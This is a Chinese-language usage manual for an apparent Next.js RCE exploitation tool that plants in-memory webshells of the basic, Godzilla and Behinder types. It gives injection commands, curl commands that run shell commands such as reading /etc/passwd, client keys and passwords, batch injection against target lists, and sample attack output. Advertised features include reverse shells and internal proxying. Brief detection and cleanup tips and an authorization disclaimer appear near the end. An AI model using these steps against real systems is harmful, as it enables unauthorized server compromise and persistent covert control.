# Next.js RCE 内存马使用文档

## 内存马类型

本工具支持3种不同类型的内存马注入：

### 1. 基础内存马 (basic)

**特点**：
- 最简单的命令执行内存马
- 通过HTTP GET请求执行系统命令
- JSON格式返回结果
- 无需客户端工具

**注入命令**：
```bash
./nextjs-rce-tool --shell --type basic --target http://example.com
```

**使用方式**：
```bash
# 执行命令
curl "http://example.com/exec?cmd=whoami"
curl "http://example.com/exec?cmd=ls -la"
curl "http://example.com/exec?cmd=cat /etc/passwd"
```

**返回格式**：
```json
{
  "success": true,
  "stdout": "root\n",
  "stderr": "",
  "error": null
}
```

**优点**：
- 使用简单，只需浏览器或curl即可
- 返回格式清晰
- 调试方便

**缺点**：
- 功能有限，仅支持命令执行
- 无文件管理功能
- 流量特征明显

---

### 2. Godzilla哥斯拉内存马 (godzilla)

**特点**：
- 支持Godzilla客户端连接
- AES-128-ECB加密通信
- 功能完整的Webshell
- 支持文件管理、命令执行等

**注入命令**：
```bash
./nextjs-rce-tool --shell --type godzilla --target http://example.com
```

**连接配置**：
- **密码参数名**: pass
- **密钥**: 3c6e0b8a9c15224a
- **加密方式**: AES-128-ECB
- **目标类型**: NODEJS (在Godzilla中选择)
- **Shell地址**: http://example.com/ (任意路径均可)

**Godzilla客户端配置步骤**：
1. 打开Godzilla工具
2. 右键 -> 添加 -> 新建目标
3. 配置如下：
   - URL: `http://example.com/`
   - 密码: `pass`
   - 密钥: `3c6e0b8a9c15224a`
   - Shell类型: NODEJS_AES_BASE64
   - 请求方式: POST
4. 点击测试连接

**功能特性**：
- ✅ 命令执行
- ✅ 文件上传/下载
- ✅ 文件管理（浏览、删除、编辑）
- ✅ 反弹Shell
- ✅ 端口扫描
- ✅ 内网代理

**技术细节**：
```javascript
// 加密流程
1. 客户端发送加密的JavaScript代码
2. 服务端使用AES-128-ECB解密
3. 执行代码并获取结果
4. 使用相同密钥加密结果返回
```

**流量特征**：
- POST请求
- 参数名为 "pass"
- Base64编码的AES加密数据
- 响应为Base64编码

---

### 3. Behinder冰蝎内存马 (behinder)

**特点**：
- 支持冰蝎（Behinder）客户端连接
- AES-128-CBC加密通信
- 动态密钥（基于MD5）
- 流量加密更强

**注入命令**：
```bash
./nextjs-rce-tool --shell --type behinder --target http://example.com
```

**连接配置**：
- **连接密码**: rebeyond
- **实际密钥**: e45e329feb5d925b (MD5("rebeyond")的前16位)
- **加密方式**: AES-128-CBC
- **目标类型**: NODEJS
- **Shell地址**: http://example.com/ (任意路径均可)

**冰蝎客户端配置步骤**：
1. 打开冰蝎工具（Behinder）
2. 右键 -> 新增
3. 配置如下：
   - URL: `http://example.com/`
   - 密码: `rebeyond`
   - 类型: 选择 NODEJS
4. 双击连接

**功能特性**：
- ✅ 虚拟终端
- ✅ 文件管理
- ✅ 数据库管理
- ✅ 内网穿透
- ✅ 反弹Shell
- ✅ 自定义代码执行

**技术细节**：
```javascript
// 加密流程
1. 密钥 = MD5("rebeyond").substring(0, 16)
2. IV = 密钥（CBC模式需要IV）
3. 客户端发送AES-CBC加密的代码（Base64）
4. 服务端解密执行后再次加密返回
```

**流量特征**：
- POST请求，无固定参数名
- 请求体直接为Base64编码的密文
- 响应为Base64编码
- 使用MD5动态生成密钥

---

## 使用场景对比

| 特性 | Basic | Godzilla | Behinder |
|------|-------|----------|----------|
| 易用性 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
| 功能性 | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 隐蔽性 | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 需要工具 | ❌ | ✅ | ✅ |
| 文件管理 | ❌ | ✅ | ✅ |
| 数据库管理 | ❌ | ✅ | ✅ |
| 内网代理 | ❌ | ✅ | ✅ |

## 批量注入

```bash
# 创建目标文件
cat > targets.txt << EOF
http://target1.com
http://target2.com
http://target3.com
EOF

# 批量注入Godzilla
./nextjs-rce-tool --shell --type godzilla --file targets.txt

# 批量注入冰蝎
./nextjs-rce-tool --shell --type behinder --file targets.txt
```

## 安全建议

### 1. 清除内存马
内存马存在于进程内存中，清除方式：
```bash
# 重启Node.js进程即可清除
pm2 restart app
# 或
systemctl restart your-app
```

### 2. 检测方法
- 监控异常的HTTP请求（特别是POST请求）
- 检查进程内存中的可疑代码
- 监控`http.Server.prototype.emit`的修改

### 3. 防御措施
- 升级Next.js到最新版本
- 实施严格的输入验证
- 使用WAF拦截可疑请求
- 监控原型链污染攻击

## 工具下载

### Godzilla（哥斯拉）
- GitHub: https://github.com/BeichenDream/Godzilla
- 版本: 推荐使用最新版
- 支持平台: Windows/Linux/Mac

### Behinder（冰蝎）
- GitHub: https://github.com/rebeyond/Behinder
- 版本: 3.0+ (支持Node.js)
- 支持平台: Windows/Linux/Mac

## 常见问题

**Q: 注入后无法连接？**
A: 
1. 确认目标服务器仍在运行
2. 检查防火墙/WAF规则
3. 验证密钥配置是否正确
4. 尝试其他路径（内存马拦截所有POST请求）

**Q: Godzilla和冰蝎有什么区别？**
A:
- Godzilla: 更现代，界面友好，功能丰富
- 冰蝎: 更隐蔽，流量特征少，使用动态密钥

**Q: 为什么选择这些密钥？**
A:
- Godzilla: 使用默认配置便于测试
- Behinder: 使用经典密钥"rebeyond"

**Q: 可以自定义密钥吗？**
A: 可以修改exploit.go中的密钥常量：
```go
// Godzilla
const PASS='pass';
const KEY='3c6e0b8a9c15224a';

// Behinder
const KEY='e45e329feb5d925b';
```

**Q: 内存马会被重启清除吗？**
A: 是的，内存马存在于进程内存中，进程重启后会被清除。

## 免责声明

本工具仅供授权的安全测试使用！

- ⚠️ 仅在获得明确授权的系统上使用
- ⚠️ 未经授权的攻击行为是违法的
- ⚠️ 使用本工具造成的任何后果由使用者自行承担
- ⚠️ 建议在测试环境中使用

## 示例演示

### 注入Godzilla内存马
```bash
$ ./nextjs-rce-tool --shell --type godzilla --target http://192.168.1.100:3000

[*] 注入内存马到: http://192.168.1.100:3000
[*] 内存马类型: Godzilla 哥斯拉
[*] 密码: pass (参数名)
[*] 密钥: 3c6e0b8a9c15224a
[*] 加密: AES-128-ECB
[+] 内存马注入完成
[*] 响应状态码: 200
[+] Webshell地址: http://192.168.1.100:3000 (任意路径)

[+] 使用说明:
  1. 使用Godzilla工具连接
  2. 选择目标类型: NODEJS
  3. 密码参数: pass
  4. 密钥: 3c6e0b8a9c15224a

[!] 提示: 内存马已注入，使用对应工具连接即可
```

### 注入冰蝎内存马
```bash
$ ./nextjs-rce-tool --shell --type behinder --target http://192.168.1.100:3000

[*] 注入内存马到: http://192.168.1.100:3000
[*] 内存马类型: Behinder 冰蝎
[*] 密码: rebeyond
[*] 密钥: e45e329feb5d925b (MD5前16位)
[*] 加密: AES-128-CBC
[+] 内存马注入完成
[*] 响应状态码: 200
[+] Webshell地址: http://192.168.1.100:3000 (任意路径)

[+] 使用说明:
  1. 使用冰蝎工具连接
  2. 选择目标类型: NODEJS
  3. 连接密码: rebeyond

[!] 提示: 内存马已注入，使用对应工具连接即可
```
